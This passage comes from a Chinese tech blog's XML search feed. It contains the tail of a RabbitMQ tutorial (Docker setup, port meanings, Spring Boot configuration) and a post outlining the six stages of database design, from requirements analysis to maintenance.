<p>3、消费者监听指定的Queue (队列)</p>
<p>4、当有消息到达Queue时Broker默认将消息推送给消费者。</p>
<p>5、消费者接收到消息。</p>
<h2 id="2-2-下载安装"><a href="#2-2-下载安装" class="headerlink" title="2.2 下载安装"></a>2.2 下载安装</h2><h3 id="2-2-1-Windows下安装"><a href="#2-2-1-Windows下安装" class="headerlink" title="2.2.1 Windows下安装"></a>2.2.1 Windows下安装</h3><p>参考安装步骤：<a href="https://blog.csdn.net/qq_47588845/article/details/107986373">https://blog.csdn.net/qq_47588845/article/details/107986373</a></p>
<h3 id="2-2-2-Docker下安装"><a href="#2-2-2-Docker下安装" class="headerlink" title="2.2.2 Docker下安装"></a>2.2.2 Docker下安装</h3><p>1.下载镜像</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker pull rabbitmq:management</span><br></pre></td></tr></table></figure>
<p>2.创建容器</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">docker run -d  -e RABBITMQ_DEFAULT_USER=admin -e RABBITMQ_DEFAULT_PASS=admin -p <span class="number">15672</span>:<span class="number">15672</span> -p <span class="number">5672</span>:<span class="number">5672</span> -p <span class="number">25672</span>:<span class="number">25672</span> -p <span class="number">61613</span>:<span class="number">61613</span> -p <span class="number">1883</span>:<span class="number">1883</span> --name rabbitmq　rabbitmq:management</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<p><strong>RABBITMQ_DEFAULT_USER=admin -e RABBITMQ_DEFAULT_PASS=admin：</strong>指的是web管理平台的用户名和密码</p>
<p><strong>-p 15672:15672：</strong>是控制平台docker映射到系统的对应端口</p>
<p><strong>-p 5672:5672：</strong>是应用程序的访问端口</p>
<p>3.进入web管理界面</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.200.133:15672</span></span><br></pre></td></tr></table></figure>
<p>刚刚设置的是admin，根据提示输入即可。如果不设置默认为guest</p>
<h3 id="2-2-3-RabbitMQ端口解释"><a href="#2-2-3-RabbitMQ端口解释" class="headerlink" title="2.2.3 RabbitMQ端口解释"></a>2.2.3 RabbitMQ端口解释</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">-   <span class="number">4369</span> (epmd), <span class="number">25672</span> (Erlang distribution)</span><br><span class="line">-   <span class="number">5672</span>, <span class="number">5671</span> (AMQP <span class="number">0</span><span class="number">-9</span><span class="number">-1</span> without <span class="keyword">and</span> with TLS)</span><br><span class="line">-   <span class="number">15672</span> (<span class="keyword">if</span> management plugin <span class="keyword">is</span> enabled)</span><br><span class="line">-   <span class="number">61613</span>, <span class="number">61614</span> (<span class="keyword">if</span> STOMP <span class="keyword">is</span> enabled)</span><br><span class="line">-   <span class="number">1883</span>, <span class="number">8883</span> (<span class="keyword">if</span> MQTT <span class="keyword">is</span> enabled)</span><br></pre></td></tr></table></figure>
<p><strong>4369 (epmd), 25672 (Erlang distribution)</strong></p>
<p>　　Epmd 是 Erlang Port Mapper Daemon 的缩写，在 Erlang 集群中相当于 dns 的作用，绑定在4369端口上。</p>
<p><strong>5672, 5671 (AMQP 0-9-1 without and with TLS)</strong></p>
<p>　　AMQP 是 Advanced Message Queuing Protocol 的缩写，一个提供统一消息服务的应用层标准高级消息队列协议，是应用层协议的一个开放标准，专为面向消息的中间件设计。基于此协议的客户端与消息中间件之间可以传递消息，并不受客户端/中间件不同产品、不同的开发语言等条件的限制。Erlang 中的实现有 RabbitMQ 等。</p>
<p><strong>15672 (if management plugin is enabled)</strong></p>
<p>　　通过 <a href="http://serverip:15672">http://serverip:15672</a> 访问 RabbitMQ 的 Web 管理界面，默认用户名密码都是 guest。（注意：RabbitMQ 3.0之前的版本默认端口是55672，下同）</p>
<p><strong>61613, 61614 (if STOMP is enabled)</strong></p>
<p>　　Stomp 是一个简单的消息文本协议，它的设计核心理念就是简单与可用性，官方文档，实践一下 Stomp 协议需要：</p>
<p>　　　　　1.一个支持 stomp 消息协议的 messaging server (譬如activemq，rabbitmq）；</p>
<p>　　　　　2.一个终端（譬如linux shell);</p>
<p>　　　　　3.一些基本命令与操作（譬如nc，telnet)</p>
<p><strong>1883, 8883 (if MQTT is enabled)</strong></p>
<p>　　MQTT 只是 IBM 推出的一个消息协议，基于 TCP/IP 的。两个 App 端发送和接收消息需要中间人，这个中间人就是消息服务器（比如ActiveMQ/RabbitMQ），三者通信协议就是 MQTT</p>
<p>可以通过配置RabbitMQ来使用其它端口。</p>
<p><strong>默认用户访问</strong></p>
<p>　　协商器创造了一个密码为guest的用户guest。未配置的客户端一般都会这些凭证。当访问localhost的时候这些凭证都会默认被使用，所以当从其它机器连接过来前你需要做点变动。访问控制文档里介绍了增加用户、删除用户、允许用户的远程访问等操作。</p>
<h2 id="2-3-RabbitMQ角色分类"><a href="#2-3-RabbitMQ角色分类" class="headerlink" title="2.3 RabbitMQ角色分类"></a>2.3 RabbitMQ角色分类</h2><h2 id="2-3-Springboot集成rabbitMQ"><a href="#2-3-Springboot集成rabbitMQ" class="headerlink" title="2.3 Springboot集成rabbitMQ"></a>2.3 Springboot集成rabbitMQ</h2><p>按照官方教程（<a href="http://www.rabbitmq.com/getstarted.html）测试helloworld">http://www.rabbitmq.com/getstarted.html）测试helloworld</a></p>
<p><strong>1.添加依赖</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>2.配置application.yml</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">spring.rabbitmq.host=192.168.200.133</span></span><br><span class="line"><span class="string">spring.rabbitmq.port=5672</span></span><br><span class="line"><span class="string">spring.rabbitmq.username=admin</span></span><br><span class="line"><span class="string">spring.rabbitmq.password=admin</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>中间件</category>
      </categories>
  </entry>
  <entry>
    <title>软件工程-数据库设计步骤</title>
    <url>/post/4e818cde.html</url>
    <content><![CDATA[<h1 id="总体设计步骤"><a href="#总体设计步骤" class="headerlink" title="总体设计步骤"></a>总体设计步骤</h1><p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1620267471-image-20210506101750936.png" alt="image-20210506101750936"></p>
<h1 id="1、需求分析"><a href="#1、需求分析" class="headerlink" title="1、需求分析"></a>1、需求分析</h1><p>　　数据库设计的起点，目标：了解与分析用户的信息及应用处理的要求，并将结果按一定格式整理而形成需求分析报告，该分析报告是后续概念设计，逻辑设计，物理设计，数据库建立与维护的依据<span id="more"></span></p>
<p>步骤：</p>
<ul>
<li>确定数据库范围<ul>
<li>有效利用计算机设备及数据库系统的潜在能力</li>
<li>提高数据库的应变能力</li>
<li>避免应用过程中对数据库做太多或太大的修改</li>
<li>延长数据库的生命周期</li>
</ul>
</li>
<li><p>应用过程分析</p>
<ul>
<li>用到哪些数据</li>
<li>数据使用的顺序</li>
<li>对数据作何处理和处理的策略以及结果</li>
</ul>
</li>
<li><p>收集与分析数据</p>
<ul>
<li><p>动态结构 - 将应用操作施加于数据之上后数据的状况</p>
<ul>
<li>任务分类表 - 完成某一特定功能的独立的操作序列</li>
<li>数据特征操作表 - 描述任务和数据之间的关系</li>
</ul>
</li>
<li><p>数据约束 - 使用数据时的特殊要求</p>
<ul>
<li>数据的安全保密性 - 不同的用户, 不同的权限</li>
<li>数据的完整性</li>
<li>响应时间</li>
<li>数据恢复</li>
</ul>
</li>
<li><p>静态结构 - 不施加应用操作于其上时数据的原始状况</p>
<ul>
<li>数据分类表 - 用于数据的总体描述</li>
<li>数据元素表 - 数据项或属性</li>
</ul>
</li>
</ul>
</li>
<li><p>编写需求分析报告</p>
<ul>
<li>数据库的应用功能目标</li>
<li>标明不同用户视图范围</li>
<li>应用处理过程需求说明</li>
<li>数据字典</li>
<li>数据量</li>
<li>数据约束</li>
</ul>
</li>
</ul>
<h1 id="2、概念结构设计"><a href="#2、概念结构设计" class="headerlink" title="2、概念结构设计"></a>2、概念结构设计</h1><p>　　对用户需求进行综合、归纳、抽象、形成一个与具体的DBMS无关概念模型（一般为ER模型）。</p>
<p>工作步骤：</p>
<p>　　设计局部视图—&gt;抽象数据—&gt;修改重构消除冗余—&gt;合并取消冲突</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1620268296-image-20210506103136206.png" alt="image-20210506103136206"></p>
<p>特点：</p>
<ul>
<li>能真实、充分地反映现实世界</li>
<li>易于理解</li>
<li>易于更改</li>
<li>易于向关系、网状、层次等各种数据模型转换</li>
</ul>
<p>一共有四种方法：</p>
<ul>
<li>自顶向下</li>
</ul>
<blockquote>
<p>首先定义全局概念结构的框架，然后逐步细化</p>
</blockquote>
<ul>
<li>自底向上</li>
</ul>
<blockquote>
<p>首先定义个局部应用的概念结构，然后将它们集合起来，得到全局概念</p>
</blockquote>
<ul>
<li>逐步扩展</li>
</ul>
<blockquote>
<p>首先定义最重要的核心概念结构，然后向外扩充，以滚球的方法逐步生成其他概念结构，知道总体概念结构</p>
</blockquote>
<ul>
<li>混合策略</li>
</ul>
<blockquote>
<p>将自顶向下和自底向上相结合，用自顶向下策略设计一个全局概念结构框架，以他为骨架继承自底向上策略中设计的局部概念结构</p>
</blockquote>
<h1 id="3、逻辑结构设计"><a href="#3、逻辑结构设计" class="headerlink" title="3、逻辑结构设计"></a>3、逻辑结构设计</h1><p>　　将概念结构设计的概念模型转化为某个特定的DBMS所支持的数据模型，建立数据库逻辑模式，并对其进行优化，同时为各种用户和应用设计外模式。</p>
<p>工作步骤：</p>
<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1620268537-image-20210506103536983.png" alt="image-20210506103536983"></p>
<h1 id="4、物理结构设计"><a href="#4、物理结构设计" class="headerlink" title="4、物理结构设计"></a>4、物理结构设计</h1><p>　　为设计好的逻辑模型选择物理结构，包括存储结构和存取方法等，建立数据库物理模式。</p>
<p>步骤：</p>
<ul>
<li>确定数据库的物理结构，在关系数据库中主要指存取方法和存储结构</li>
<li>对物理结构进行评价，评价的重点是时间和空间效率</li>
</ul>
<h1 id="5、数据库的实施"><a href="#5、数据库的实施" class="headerlink" title="5、数据库的实施"></a>5、数据库的实施</h1><p>数据装载方法:</p>
<ul>
<li>人工方法</li>
<li>计算机辅助数据入库</li>
</ul>
<p>主要工作:</p>
<ul>
<li>功能测试:实际运行数据库应用程序,执行对数据库的各种操作,测试应用程序的功能是否满足设计要求,如果不满足,对应用程序部分则要修改、调整,直到达到设计要求</li>
<li>性能测试:测量系统的性能指标,分析是否达到设计目标,如果测试的结果与设计目标不符,则要返回物理设计阶段,重新调整物理结构,修改系统参数,某些情况下甚至要返回逻辑设计阶段,修改逻辑结构</li>
</ul>
<h1 id="6、数据库运行和维护"><a href="#6、数据库运行和维护" class="headerlink" title="6、数据库运行和维护"></a>6、数据库运行和维护</h1><p>DBA维护数据库工作:</p>
<ul>
<li>数据库的转储和恢复</li>
<li>数据库的安全性、完整性控制</li>
<li>数据库性能的监督、分析和改进</li>
<li>数据库的重组织和重构造</li>
</ul>
]]></content>
  </entry>
</search>
